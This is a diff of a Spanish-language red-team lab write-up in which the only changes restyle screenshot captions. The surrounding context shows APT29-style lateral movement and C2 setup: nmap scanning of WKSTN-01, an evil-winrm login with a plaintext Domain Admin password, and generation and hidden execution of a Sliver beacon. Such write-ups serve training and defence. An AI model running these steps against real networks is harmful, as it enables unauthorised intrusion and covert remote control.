@@ -20,7 +20,7 @@ Con `backup_svc` como Domain Admin sobre `atackcorp.local`, APT29 procede a move
 
 ### 6.0 — Reconocimiento de WKSTN-01
 **Técnica MITRE:** T1046 — Network Service Discovery  
-**Captura:** ![fase6-00](../screenshots/FASE-6-Lateral-Movement/fase6-00-nmap-wkstn01.png)
+> 📸 Captura: ![fase6-00](../screenshots/FASE-6-Lateral-Movement/fase6-00-nmap-wkstn01.png)
 
 ```bash
 # Port discovery
@@ -55,7 +55,7 @@ sudo nmcli con up LabRedTeam
 
 ### 6.1 — Acceso remoto via WinRM
 **Técnica MITRE:** T1021.006 — Remote Services: Windows Remote Management  
-**Captura:** ![fase6-01](../screenshots/FASE-6-Lateral-Movement/fase6-01-lateral-movement-winrm.png)
+> 📸 Captura: ![fase6-01](../screenshots/FASE-6-Lateral-Movement/fase6-01-lateral-movement-winrm.png)
 
 ```bash
 evil-winrm -i 10.0.2.8 -u backup_svc -p 'Backup2024!'
@@ -87,7 +87,7 @@ whoami /groups
 ---
 
 ### 6.2 — Verificación del objetivo
-**Captura:** ![fase6-02](../screenshots/FASE-6-Lateral-Movement/fase6-02-wkstn01-info.png)
+> 📸 Captura: ![fase6-02](../screenshots/FASE-6-Lateral-Movement/fase6-02-wkstn01-info.png)
 
 ```powershell
 hostname
@@ -119,7 +119,7 @@ APT29 es conocido por desplegar infraestructura C2 encubierta usando canales HTT
 ---
 
 ### 7.1 — Instalación y arranque de Sliver
-**Captura:** ![fase7-01](../screenshots/FASE-7-C2-Establishment/fase7-01-sliver-listener.png)
+> 📸 Captura: ![fase7-01](../screenshots/FASE-7-C2-Establishment/fase7-01-sliver-listener.png)
 
 ```bash
 # Instalación
@@ -149,7 +149,7 @@ ID  Name   Protocol  Port
 ---
 
 ### 7.2 — Generación del beacon
-**Captura:** ![fase7-02](../screenshots/FASE-7-C2-Establishment/fase7-02-sliver-beacon-generated.png)
+> 📸 Captura: ![fase7-02](../screenshots/FASE-7-C2-Establishment/fase7-02-sliver-beacon-generated.png)
 
 ```
 sliver > generate beacon \
@@ -179,7 +179,7 @@ sliver > generate beacon \
 ---
 
 ### 7.3 — Despliegue en WKSTN-01
-**Captura:** ![fase7-03](../screenshots/FASE-7-C2-Establishment/fase7-03-sliver-beacon-upload-exec.png)
+> 📸 Captura: ![fase7-03](../screenshots/FASE-7-C2-Establishment/fase7-03-sliver-beacon-upload-exec.png)
 
 ```bash
 # Conectar a WKSTN-01
@@ -201,7 +201,7 @@ Start-Process -FilePath ".\beacon.exe" -WindowStyle Hidden
 ---
 
 ### 7.4 — Beacon conectado
-**Captura:** ![fase7-04](../screenshots/FASE-7-C2-Establishment/fase7-04-sliver-beacon-connected.png)
+> 📸 Captura: ![fase7-04](../screenshots/FASE-7-C2-Establishment/fase7-04-sliver-beacon-connected.png)
 
 ```
 [*] Beacon be691c17 EASY_PROFIT - 10.0.2.8:60303 (WKSTN-01) - windows/amd64 - Wed, 13 May 2026 10:03:22 CEST
@@ -210,7 +210,7 @@ Start-Process -FilePath ".\beacon.exe" -WindowStyle Hidden
 ---
 
 ### 7.5 — Interacción con el beacon
-**Captura:** ![fase7-05](../screenshots/FASE-7-C2-Establishment/fase7-05-sliver-beacon-interaction.png)
+> 📸 Captura: ![fase7-05](../screenshots/FASE-7-C2-Establishment/fase7-05-sliver-beacon-interaction.png)
 
 ```
 sliver > beacons
